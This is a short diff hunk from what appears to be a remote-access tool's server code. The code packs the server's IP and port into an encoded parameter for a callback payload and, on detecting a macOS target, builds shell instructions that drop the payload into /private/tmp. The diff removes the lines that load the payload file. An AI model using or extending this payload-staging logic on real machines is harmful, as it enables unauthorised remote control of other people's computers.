@@ -104,9 +104,6 @@ class Server:
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
             self.verbose_print("Detected macOS")
-            f = open("resources/mplmacos", "rb")
-            payload = f.read()
-            f.close()
             #save to tmp, 
             instructions = \
             "cat >/private/tmp/tmpmpl;"+\
